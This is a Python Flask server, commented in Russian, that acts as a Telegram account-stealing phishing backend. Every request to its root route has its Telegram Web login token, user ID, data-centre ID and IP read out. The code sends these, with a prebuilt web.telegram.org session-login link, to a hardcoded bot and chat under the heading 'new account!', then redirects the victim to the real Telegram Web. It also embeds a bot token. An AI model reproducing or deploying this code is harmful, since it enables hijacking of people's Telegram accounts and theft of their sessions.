from flask import Flask, request, redirect
import requests
import os
import sys
from datetime import datetime

# Принудительно сбрасываем буфер вывода
sys.stdout.reconfigure(line_buffering=True)

app = Flask(__name__)

# ТВОИ ДАННЫЕ
BOT_TOKEN = "8541613029:AAF9uWzlAYEJy1kNM89yQfMtIz3bh53AOo4"
CHAT_ID = "8220267007"

print("🚀 ПРИЛОЖЕНИЕ ЗАПУЩЕНО!", flush=True)
print(f"📊 BOT_TOKEN: {BOT_TOKEN[:5]}...", flush=True)
print(f"📊 CHAT_ID: {CHAT_ID}", flush=True)

@app.before_request
def log_request_info():
    """Логируем каждый запрос ДО обработки"""
    print(f"\n{'='*50}", flush=True)
    print(f"🔥 ВРЕМЯ: {datetime.now().isoformat()}", flush=True)
    print(f"📌 МЕТОД: {request.method}", flush=True)
    print(f"📌 ПУТЬ: {request.path}", flush=True)
    print(f"📌 URL: {request.url}", flush=True)
    print(f"📌 ARGS: {dict(request.args)}", flush=True)
    print(f"📌 HEADERS: {dict(request.headers)}", flush=True)

@app.route('/')
def index():
    try:
        # Получаем параметры
        token = request.args.get('tgWebAuthToken')
        user_id = request.args.get('tgWebAuthUserId')
        dc_id = request.args.get('tgWebAuthDcId', '2')
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        
        print(f"\n📦 ОБРАБОТКА ЗАПРОСА:", flush=True)
        print(f"   🔑 Токен: {token if token else 'НЕТ'}", flush=True)
        print(f"   👤 User ID: {user_id if user_id else 'НЕТ'}", flush=True)
        print(f"   🌐 DC: {dc_id}", flush=True)
        print(f"   📱 IP: {ip}", flush=True)
        
        # Если есть токен - отправляем
        if token and user_id:
            print(f"\n📤 ОТПРАВКА В TELEGRAM...", flush=True)
            
            login_url = f"https://web.telegram.org/k/#tgWebAuthToken={token}&tgWebAuthUserId={user_id}&tgWebAuthDcId={dc_id}"
            
            message = (
                f"🔥 НОВЫЙ АККАУНТ!\n"
                f"━━━━━━━━━━━━━━━━\n"
                f"👤 User ID: {user_id}\n"
                f"🔑 Token: {token}\n"
                f"🌐 DC: {dc_id}\n"
                f"📱 IP: {ip}\n"
                f"🕐 Время: {datetime.now().strftime('%H:%M:%S')}\n"
                f"━━━━━━━━━━━━━━━━\n"
                f"🔗 ССЫЛКА:\n{login_url}"
            )
            
            try:
                r = requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    json={"chat_id": CHAT_ID, "text": message},
                    timeout=5
                )
                print(f"   ✅ Статус: {r.status_code}", flush=True)
                if r.status_code == 200:
                    print(f"   ✅ УСПЕШНО!", flush=True)
                else:
                    print(f"   ❌ Ошибка: {r.text}", flush=True)
            except Exception as e:
                print(f"   ❌ Ошибка отправки: {e}", flush=True)
        else:
            print(f"\n⚠️ НЕТ ТОКЕНА - пропускаем отправку", flush=True)
        
        print(f"\n↩️ РЕДИРЕКТ на web.telegram.org", flush=True)
        return redirect('https://web.telegram.org/k/')
        
    except Exception as e:
        print(f"\n💥 ОШИБКА: {e}", flush=True)
        return redirect('https://web.telegram.org/k/')

@app.route('/health')
def health():
    return 'OK', 200

@app.errorhandler(Exception)
def handle_error(e):
    print(f"❌ Глобальная ошибка: {e}", flush=True)
    return redirect('https://web.telegram.org/k/')

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print(f"🚀 Сервер запускается на порту {port}", flush=True)
    app.run(host='0.0.0.0', port=port, debug=False)
